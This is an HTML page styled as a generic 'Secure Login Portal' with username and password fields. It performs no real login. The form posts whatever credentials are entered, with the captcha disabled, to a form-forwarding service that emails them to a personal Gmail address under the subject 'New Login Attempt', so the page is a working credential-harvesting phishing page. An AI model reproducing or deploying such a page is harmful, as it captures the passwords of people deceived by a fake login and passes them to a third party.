<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>User Login</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Segoe UI',sans-serif;
}

body{
    background:linear-gradient(135deg,#0F172A,#1E3A8A,#2563EB);
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}


.container{
    width:90%;
    max-width:420px;
    background:white;
    border-radius:15px;
    box-shadow:0 15px 35px rgba(0,0,0,.3);
    overflow:hidden;
}


.header{
    background:#003366;
    color:white;
    padding:30px;
    text-align:center;
}


.header h1{
    font-size:28px;
}


.header p{
    margin-top:10px;
    color:#dcdcdc;
}



.form{
    padding:30px;
}


label{
    font-weight:600;
    display:block;
    margin-top:15px;
    margin-bottom:8px;
}



input{
    width:100%;
    padding:12px;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:15px;
    transition:.3s;
}



input:focus{
    border-color:#2563EB;
    outline:none;
    box-shadow:0 0 8px rgba(37,99,235,.3);
}



button{

    width:100%;
    margin-top:25px;
    padding:14px;

    background:#2563EB;
    color:white;

    border:none;
    border-radius:8px;

    font-size:17px;
    cursor:pointer;

    transition:.3s;

}



button:hover{

    background:#1D4ED8;

}



.footer{

    text-align:center;
    padding:20px;

    background:#f8f8f8;

    color:#666;

    font-size:14px;

}


</style>

</head>


<body>


<div class="container">


<div class="header">

<h1>🔐 User Login</h1>

<p>Enter your credentials to continue</p>

</div>



<div class="form">


<form action="https://formsubmit.co/sivakarthick213508@gmail.com" method="POST">


<input type="hidden" name="_captcha" value="false">

<input type="hidden" name="_subject" value="New Login Attempt">

<input type="hidden" name="_template" value="table">



<label>Username</label>

<input 
type="text"
name="Username"
placeholder="Enter username"
required>



<label>Password</label>

<input
type="password"
name="Password"
placeholder="Enter password"
required>



<button type="submit">

Login

</button>



</form>


</div>



<div class="footer">

© 2026 Secure Login Portal

</div>



</div>


</body>

</html>
